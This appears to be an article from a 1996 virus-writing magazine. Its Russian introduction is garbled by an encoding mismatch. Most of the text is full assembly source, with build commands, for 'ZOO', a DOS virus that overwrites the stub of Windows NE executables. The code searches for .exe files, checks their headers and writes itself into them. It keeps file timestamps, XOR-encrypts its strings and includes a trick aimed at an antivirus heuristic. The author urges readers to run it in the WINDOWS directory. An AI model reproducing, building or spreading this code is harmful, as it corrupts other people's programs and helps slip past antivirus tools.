COMMENT *
      ��                  �
     ���  Virus Magazine  � Box 10, Kiev 148, Ukraine       IV   1996
     ��� ���������������� � ������������������� � ��������  ���������
      �� ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���   � � ��� �
       � � � ��  ��  �    �  ��  � �    � � � � � �   �     � � � � �
       � � � �   ��� ���  �  ��� ���     �� ��� � ��� ����  � � ��� �
       � ����������������� �������������������������������  ���������
          (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.


               ��� �ਢ���⢮���� ⥡� �� ࠧ, 㢠����� ��⥫�!
 ���-� �� ��諮� ������ ᨤ�� � � ���-��ᨨ � ��@#�� ��⠫���
 ���᭮�� ���d0Yz, ��ਫ �, ᫥��� ᢮�� ����饭�᪨� �ਢ�窠�,
 �訫 F3 �� exe譨��� ����������. ����� �� ��ࢮ� - ���� ��
 �䨣��. ����� �� ��஬, ��⮬ �� ���쥬... :-[  ] ���, ��
 ����� ����� ஡�� ���⠫ ⥫� ᢮� �����쪮� � ��� exe譨���,
 � �����⨫� ���� ����⥫쭮��� �������� �i�ڎ$0�� - �� ��ᥬ�-
 ����� �ணࠬ��, �뤠���� �� ��࠭ ��ப� 'This program requires
 Microsoft Windows.', �� ᢮��� ����⨫� �� 90 ���� (� EXE-�ଠ�),
 � 楫� 1 �!
      � ���쭥�襬 ��ᬠ�ਢ�� NE誨 (� ��᫥ New Executable), �
 �����㦨�, �� ���������� ��� Borland ⠪�� ��ન �� ��⠢����.
 �, ᮮ⢥��⢥���, ��� �� �訫 ���஡����� ������ � �⮬ ��������
 (��祬 ����� �⮫쪮 ���� �ய�����? ;-) �� �� �⮣� ����稫��� -
 ᬮ��� ����. ��� ��砫� ������� �ன����� �� �⮬� "������"
 ���������. ��� ����� �� �ᥣ� �������� ����� ⮫쪮 �� �᫮���:
 �� ᬥ饭�� 400h ������ ����� ��������� �������� �ண�, � ������
 'NE', � ��砫� �ண� �� ᬥ饭�� 0h - 'MZ' � �� ᬥ饭�� 3bh ����
 ���� - 00h, 00h, 04h, 00h, 00h. ��䨣� ��� ⠬ �㦭� � ⠪ � ��
 ����, �� ��� ��� ����� ��⠥�, �� exe譨� ���� ���-�ਫ���-
 ����. ��������, �� �� �ࠢ���, �� 䨣�� ��������� ⮫쪮
 � exe譨���, ������ 'NE' �� ᬥ饭�� 400h (�� ��类� ��砥
 ��㣨� ��ਠ�⮢ ���-�ணࠬ�� � 'NE' �� 400h � �� ��襫).
 ���, ᮡ�⢥���, �����ᥬ���஢���� ���⮪ �⮩ ᠬ��
 ���-�ணࠬ��. ����, �� ����騥 ��᫮��� ����㧪�, �
 ���㤠 �모��.

 00000000 dec bp ; 'M' ᨣ�����
 00000001 pop dx ; 'Z' EXE-䠩��
 ..................
 0000003B add [bx][si],al ; �� � ᠬ� ���� ����:
 0000003D add al,0h       ; 00h, 00h, 04h, 00h, 00h
 0000003F db 0h
 ..................
 00000200 call 00000256   ; �맮� ��楤���, ��室�饩�� �� ᬥ饭�� 256h
 � ᬥ饭�� 200h, ᮡ�⢥���, � ��稭����� �ᯮ������ �⮩ ��� :)
 00000203 db 'This program requires Microsoft Windows.', 0dh, 0ah, '$'
 0000022E db 28h dup (20h) ; � 祬� ����� 40 ��� �஡����, � ⠪ �
                             �� ���� :(
 00000256 pop dx
 00000257 push cs
 00000258 pop ds           ; ds ⥯��� = cs
 00000259 mov ah,09h ; �뢮� �ࠧ� win
 0000025B int 21h
 0000025D mov ax,4c01h ; ��室 � ��� � errorlevel = 1
 00000260 int 21h
 ..................
 00000400 dec si ; 'N' ᨣ�����
 00000401 inc bp ; 'E' Windows New EXE

 �� ᬥ饭�� 40h �� 200h � � 252h �� 400h - ᯫ��� �㫨.
 �⮣�, ��� ����� ��⠥��� 400h - 20h (20h �� EXE-header) - 3Ah
 (�� �� �뢮� �ࠧ�, �ࠧ� � ��室 � ���) = 934 ����. ���
 墠⨫� 383 ����, ���뢠� ⥪�⮢� �ࠧ� � ⥫� �
 ����⨬���஢���� ���. ���ᯮ�짮���� ��⠫�� 551 ���� -
 ����� ����� �� ������� �� ������� ;-)
   ������ ������� � ⮬, �� �� ��� ZOO ������. ��� � ⥪�饬
 ��⠫��� NE-䠩�� � ����뢠���� � ���-�ணࠬ��. ��⥬ �뤠��
 ��ப� �� �, ��� �訡�� �, �����⨢ ᥩ 䠩� ��� ��ᮬ
 ('This program...') � ��室�� � ���. �㦭� NE-EXE ��।���� ��
 �६ �ਧ�����: 1) ���७�� .exe ;) 2) �� ᬥ饭�� 400h 'NE'
 3) �� ᬥ饭�� 200h '�S', � ���� ��襮��ᠭ�� call. ���쪮
 ⮣�� �� ��⠥�, �� �����, �㤠 �㦭� � ᮢ��蠥�
 ��襮��ᠭ�� ����⢨�. ��⢥�ᢥ���, ��१����� - ���
 ⠪�� 楫�� १����� �� �� ���� ��譨� �����⮬.
 �� ����� ��������� � RCE ��堭��� ��ࠦ���� ᨨ�
 䠩��� � ⥬ ᠬ� �த������ ᢮� ����⢮����� � 㤨�����
 �, ��᪠����� ���㤠, ��� �� ��� ᮢᥬ �� �������. ���
 ����� �� ���� �।����筮, � ����� �ணࠬ�� �� 㢥���-
 ������.
   ������ ������� ⥪�� ��� ������� ᥩ ZOO �������� � �����஢���
 �� ᢮�� ��設�.
    ��������� ��室��� �㦭� ᫥���騬 ��ࠧ��:
    TASM.EXE ZOO.ASM /M2 (��� ��室�)
    TLINK.EXE ZOO.OBJ /T
 ������ ��������� .com �� 383 ����. �㢨� �, �� ����稫���,
 � ��⠫�� WINDOWS, ����᪠�� � ��᫠�������! ;-) 
\\ *

.model tiny
.code
org 100h
start:
        mov ah,4eh      ; ��稭��� ���� ����
search:
        mov cx,06h
        mov si,offset fmask
        call @xor       ; ��ਯ�㥬 ��ப� '*.exe', 0h
        mov cx,20h
        int 21h
        jnc est_eshe_poroh_v_porohovnitsah
        call quit       ; ��, ����� exe譨��� ���
est_eshe_poroh_v_porohovnitsah:
        mov cx,06h
        jmp obmanem_etu_sranuyu_windu
        nop             ; ᫥���騥 �� ��ப� - � ᠬ� ���� ����
        add [bx][si],al ; 00h, 00h
        add al,00h      ; 04h, 00h
        db 00h          ; 00h
obmanem_etu_sranuyu_windu:
        mov si,offset fmask
        call @xor       ; ���ਯ�㥬 ���� ���⭮
        call savtim     ; ����/�६� ��࠭��
        cmp word ptr ds:[9ah], virlen
        jbe findnext    ; ����� �� NE-exe �㤥� ����� ����� ����?
        mov dx,9eh
        call open       ; ���뢠�� �� �⥭��
        jc findnext     ; �訡��... :(
        xchg ax,bx      ; ����� 䠩��
        call fopen_via_sft ; � ��� ⥯��� ���뢠�� �� ������ :)
        mov dx,400h
        call seek       ; 㪠��⥫� �� 400h
        call compare
        cmp word ptr ds:[slovo],'EN' ; �� NE-exe?
        jnz close       ; ��, ���
        mov dx,200h
        call seek
        call compare
        cmp word ptr ds:[slovo],'S�' ; � �筮 �� NE-exe?
        ; '�S' � ����⢥���� NE-exe ���� ��� call'� �� �뢮� �ࠧ�
        ; 'This...' � ��室 � ���
        jnz close
        mov dx,20h
        call seek
        call compare
        cmp word ptr ds:[slovo],04eb4h ; � ����� �� ��� 㦥 �뫨?
        jz close
        xor dx,dx
        call seek
        mov ah,40h      ; �� ࠧ �� �뫮 �� ��� �����, ⮣�� �㤥�
        mov dx,offset mz ; �࣠���㥬 ���� ��������� EXE-䠩��
        mov cx,20h
        int 21h
        mov ah,40h    ; �� � ����襬�� ᠬ�
        mov cx,virlen
        mov dx,100h
        int 21h
close:
        call resttim    ; �६� ����⠭����
        call @close     ; �� � 䠩��� ���஥�
findnext:
        mov ah,4fh      ; � ����� - � ᫥���饩 ���⢥
        jmp search

;;;;;; � �� ��諨 ��楤�ਭ�

fopen_via_sft:
        push bx
        push es
        push di
        mov ax,1220h
        push ax
        int 2fh
        mov bl, byte ptr es:[di]
        pop ax
        sub al,0ah
        int 2fh
        mov word ptr es:[di+02h],02h
        pop di
        pop es
        pop bx
        ret

@xor:
        push ax
        in al,42h ; �� �ਪ�� ��� wEb'� - �⮡� �� �� ��砫 EXE.Virus
        mov ah,al
        in al,42h
        cmp al,ah
        jnz @web_idiot
        ret
@web_idiot:
        pop ax
        push si
@@xor:
        xor byte ptr [si],0dbh
        inc si
        loop @@xor
        pop dx
        ret

seek:
        xor cx,cx
        mov ax,4200h
        int 21h
        ret

open:
        mov ax,3d00h
        int 21h
        ret

savtim:
        mov ax, word ptr ds:[96h]
        mov word ptr ds:[ftime], ax
        mov ax, word ptr ds:[98h]
        mov word ptr ds:[ftime+02h], ax
        ret

resttim:
        mov ax,5701h
        mov cx, word ptr ds:[ftime]
        mov dx, word ptr ds:[ftime+02h]
        int 21h
        ret

@close:
        mov ah,3eh
        int 21h
        ret

compare:
        mov cx,02h
        mov ah,3fh
        mov dx,offset slovo
        int 21h
        ret

mz      db 'M'
        db 'Z'
        db 9fh, 01h, 01h
        db 03h dup (0h)
        db 02h
        db 03h dup (0h)
        db 0ffh, 0ffh, 0f0h, 0ffh
        db 05h dup (0h)
        db 01h, 0f0h, 0ffh
        db 1ch
        db 07h dup (0h)
        ; �� ���-EXE header, ����� �� ���塞 NE-�ணࠬ���

fmask   db '*' xor 0dbh
        db '.' xor 0dbh
        db 'e' xor 0dbh
        db 'x' xor 0dbh
        db 'e' xor 0dbh
        db 0h  xor 0dbh
        ; ᨥ ���� ��஢����� ��ப� '*.exe',0h - ����⭮ ��� 祣�

win     db 'T' xor 0dbh, 'h' xor 0dbh, 'i' xor 0dbh, 's' xor 0dbh
        db 20h xor 0dbh, 'p' xor 0dbh, 'r' xor 0dbh, 'o' xor 0dbh
        db 'g' xor 0dbh, 'r' xor 0dbh, 'a' xor 0dbh, 'm' xor 0dbh
        db 20h xor 0dbh, 'r' xor 0dbh, 'e' xor 0dbh, 'q' xor 0dbh
        db 'u' xor 0dbh, 'i' xor 0dbh, 'r' xor 0dbh, 'e' xor 0dbh
        db 's' xor 0dbh, 20h xor 0dbh, 'M' xor 0dbh, 'i' xor 0dbh
        db 'c' xor 0dbh, 'r' xor 0dbh, 'o' xor 0dbh, 's' xor 0dbh
        db 'o' xor 0dbh, 'f' xor 0dbh, 't' xor 0dbh, 20h xor 0dbh
        db 'W' xor 0dbh, 'i' xor 0dbh, 'n' xor 0dbh, 'd' xor 0dbh
        db 'o' xor 0dbh, 'w' xor 0dbh, 's' xor 0dbh, '.' xor 0dbh
        db 0dh xor 0dbh, 0ah xor 0dbh, '$' xor 0dbh
end_win:
        ; �� �� ���� ��'����� �� ���� :) - �� �� ���d0Yz �⨬

author  db '(' xor 0dbh, 'c' xor 0dbh, ')' xor 0dbh
        db 20h xor 0dbh, 'D' xor 0dbh
        db 'N' xor 0dbh, 'a' xor 0dbh, 'z' xor 0dbh, 'i' xor 0dbh
        ; �� ��ப� '(c) DNazi', � ���� 㪠����� �����⢠

zoo     db '�' xor 0dbh, '�' xor 0dbh, 20h xor 0dbh
        db '�' xor 0dbh, '�' xor 0dbh, '�' xor 0dbh, '�' xor 0dbh
        db '�' xor 0dbh, 20h xor 0dbh, '�' xor 0dbh, '�' xor 0dbh
        db 20h xor 0dbh, '�' xor 0dbh, '�' xor 0dbh, '�' xor 0dbh
        db '�' xor 0dbh, '�' xor 0dbh, '�' xor 0dbh, '�' xor 0dbh
        db '�' xor 0dbh, '!' xor 0dbh
        ; � �� ᮡ�⢥��� ���祢�� ��ப� � ����� - ��� ��������
        ; '�� 㩤�� �� �����ઠ!'

quit:   ; ��室 �� � � ��ਪ� ��室
        mov cx,end_win - win
        mov si,offset win
        call @xor
        mov ah,09h ; �뢮��� �����,
                   ; �⮡� ��� ��� ������ ��㣮� ࠧ ��᪠��
        int 21h
        mov ax,4c01h    ; �� � � ����-���� ��୥���
        int 21h
slovo  equ 0f000h ; �� ���� word ��� ������
ftime  equ slovo - 04h ; � �� ��� ����/�६���
virlen equ $ - start ; ᨥ ���� ��� �����
end start

                                                (c) Dirty Nazi 1996